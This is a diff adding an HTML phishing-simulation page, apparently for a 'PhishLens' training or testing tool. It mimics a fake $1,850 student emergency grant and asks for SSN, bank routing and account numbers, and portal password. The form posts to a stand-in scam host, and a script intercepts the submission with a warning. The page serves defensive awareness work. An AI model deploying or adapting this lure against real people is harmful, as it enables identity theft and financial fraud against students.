@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Student Financial Aid & Bursary Relief Disbursement</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #f8fafc;
+    color: #1e293b;
+    margin: 0;
+    padding: 24px;
+    display: flex;
+    justify-content: center;
+  }
+  .container {
+    background: #ffffff;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+    max-width: 500px;
+    width: 100%;
+    padding: 32px;
+    box-sizing: border-box;
+    border-top: 5px solid #0284c7;
+  }
+  h2 { margin: 0 0 8px; color: #0369a1; font-size: 20px; }
+  .badge-grant {
+    display: inline-block;
+    background: #dcfce7;
+    color: #15803d;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-weight: 700;
+    font-size: 12px;
+    margin-bottom: 16px;
+  }
+  .banner-urgency {
+    background: #fffbeb;
+    border-left: 4px solid #f59e0b;
+    padding: 10px;
+    border-radius: 4px;
+    font-size: 12px;
+    margin-bottom: 20px;
+    color: #92400e;
+  }
+  .form-group { margin-bottom: 14px; }
+  label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 4px; }
+  input {
+    width: 100%;
+    padding: 9px 12px;
+    border: 1px solid #cbd5e1;
+    border-radius: 6px;
+    box-sizing: border-box;
+    font-size: 13px;
+  }
+  .btn-claim {
+    width: 100%;
+    background: #0284c7;
+    color: white;
+    border: none;
+    padding: 12px;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+  .btn-claim:hover { background: #0369a1; }
+  .demo-notice {
+    margin-top: 20px;
+    background: #f1f5f9;
+    padding: 10px;
+    border-radius: 6px;
+    font-size: 11px;
+    color: #64748b;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <span class="badge-grant">OFFICIAL STUDENT AID ALLOCATION</span>
+  <h2>Campus Emergency Relief Grant</h2>
+  <p style="font-size:13px;color:#64748b;margin-bottom:16px;">
+    Eligible students have been awarded a <b>$1,850.00</b> university grant disbursement for academic support.
+  </p>
+
+  <div class="banner-urgency">
+    <b>URGENT: 24 Hours To Confirm Student Status</b>
+    Unclaimed funds will be reallocated. Provide your direct deposit banking and identity credentials to authorize the automatic deposit.
+  </div>
+
+  <form action="http://scam-disbursement-portal.xyz/payout" method="POST" id="aid-form">
+    <div class="form-group">
+      <label for="student_name">Full Legal Name</label>
+      <input type="text" id="student_name" name="student_name" placeholder="First and Last Name" required>
+    </div>
+
+    <div class="form-group">
+      <label for="student_email">University Email (.edu)</label>
+      <input type="text" id="student_email" name="student_email" placeholder="student@university.edu" required>
+    </div>
+
+    <div class="form-group">
+      <label for="student_ssn">Social Security Number / National ID</label>
+      <input type="text" id="student_ssn" name="student_ssn" placeholder="XXX-XX-XXXX" required>
+    </div>
+
+    <div class="form-group">
+      <label for="routing_number">Bank Routing Number (9 Digits)</label>
+      <input type="text" id="routing_number" name="routing_number" placeholder="123456789" required>
+    </div>
+
+    <div class="form-group">
+      <label for="bank_account_number">Bank Account Number</label>
+      <input type="text" id="bank_account_number" name="bank_account_number" placeholder="Direct deposit account #" required>
+    </div>
+
+    <div class="form-group">
+      <label for="password">Student Portal Password (Verification)</label>
+      <input type="password" id="password" name="password" placeholder="Verify student password" required>
+    </div>
+
+    <button type="submit" class="btn-claim">Authorize Immediate $1,850 Disbursement</button>
+  </form>
+
+  <div class="demo-notice">
+    ⚠️ <b>PhishLens Student Shield Test Site:</b> Simulating high-risk student financial aid & tuition relief scams soliciting banking and SSN data.
+  </div>
+</div>
+
+<script>
+  document.getElementById("aid-form").onsubmit = function(e) {
+    e.preventDefault();
+    alert("[PhishLens Safe Intercept]\nFinancial aid scams often request direct deposit routing and SSNs. Form submission halted.");
+    return false;
+  };
+</script>
+
+</body>
+</html>
